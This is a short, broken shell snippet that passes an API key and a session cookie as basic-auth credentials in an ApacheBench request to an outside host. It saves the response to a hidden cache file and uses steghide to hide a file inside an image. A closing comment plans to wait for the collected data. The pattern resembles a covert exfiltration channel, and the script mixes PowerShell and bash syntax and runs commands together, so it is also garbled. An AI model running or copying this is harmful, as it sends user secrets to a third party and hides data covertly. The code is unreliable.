# -A auth-username:password
# Supply BASIC Authentication credentials to the server. The username and password are separated by a single : and sent on the wire base64 encoded. The string is sent regardless of whether the server needs it (i.e., has sent an 401 authentication needed).

$username = $APIKEY
$password = $COOKIE
$1 = $TOKEN_IMAGE

ab \
  -A ${username}:${password}
  http://scripts.servingtoken.com/api/bench.sh > $XDG_CACHE_HOME/.cache \
  steghide embed -ef "./test.txt" -cf "${1}" -p "${password}"

# now we need to build a syncing mechanism to wait for the data at $XDG_CACHE_HOME/.cache
